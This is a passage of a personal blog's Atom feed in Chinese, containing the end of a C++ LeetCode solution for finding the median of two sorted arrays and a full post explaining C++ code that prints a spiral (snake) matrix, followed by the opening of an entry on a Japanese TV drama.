style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> k </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> a </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_begin </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v2_begin </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">/* 丢弃 v1 的前 i + 1 (0 base) 个 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v1_begin </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v1_len </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                k </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v2_begin </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                v2_len </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                k </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> j </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">/* 相等的话就不用介意了, 随意返回一个都是第 k 小 */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_begin </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v1_len </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v2_len </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">at</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">k </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">min</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">v1_begin</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">v2_begin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">endif</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property comment" style="color:#999988;font-style:italic">//LEETCODE_MEDIAN_OF_TWO_SORTED_ARRAYS_H</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="leetcode" term="leetcode"/>
        <category label="algorithm" term="algorithm"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[打印蛇形数组]]></title>
        <id>https://vienna.bio/blog/打印蛇形数组</id>
        <link href="https://vienna.bio/blog/打印蛇形数组"/>
        <updated>2016-04-05T00:34:47.000Z</updated>
        <summary type="html"><![CDATA[唉, 不熟练连这样的题都不会入手。。]]></summary>
        <content type="html"><![CDATA[<p>唉, 不熟练连这样的题都不会入手。。</p>
<p>题目大概是这样 <a href="http://icpc.ahu.edu.cn/OJ/ContestProblem.aspx?cid=16&amp;id=410" target="_blank" rel="noopener noreferrer">http://icpc.ahu.edu.cn/OJ/ContestProblem.aspx?cid=16&amp;id=410</a>
参考了 <a href="http://www.cnblogs.com/kaima/p/4773908.html" target="_blank" rel="noopener noreferrer">http://www.cnblogs.com/kaima/p/4773908.html</a></p>
<p>外部的 while 循环检查 number 是否到 N * N, 如果 N 为偶数则可以在这里停下, (最后四个位置刚好填完)
里面第一个 if 检查奇数 N 的情况(会填充剩下一个位置)</p>
<p>然后开始填充数组, 调节 x y 的坐标值填充一圈蛇形, 一圈后 x y 回归原点
缩小 size 变量
x+1, y+1 跳入内圈重复以上步骤又填充一圈, 直至跳出 while 循环</p>
<p><img decoding="async" loading="lazy" alt="x y 走向" src="https://vienna.bio/assets/images/snake-f436a126ea12a837bd94cc8b56b2624d.jpg" width="600" height="338" class="img_GQDY"></p>
<p>代码如下</p>
<div class="language-cpp codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-cpp codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;iostream&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">namespace</span><span class="token plain"> std</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> SIZE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">110</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">SIZE</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">SIZE</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cin </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> n </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> number </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> dest </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> n </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">number </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> dest</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">number </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> dest </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> number</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">/* to left, down, right, up */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> number</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            number</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> number</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            number</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> x</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> number</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            number</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> y</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> number</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            number</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">-=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        x</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        y</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">```</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[日剧《我与明星的99日》]]></title>
        <id>https://vienna.bio/blog/日剧《我与明星的99日》</id>
        <link href="https://vienna.bio/blog/日剧《我与明星的99日》"/>
        <updated>2016-03-29T19:19:49.000Z</updated>
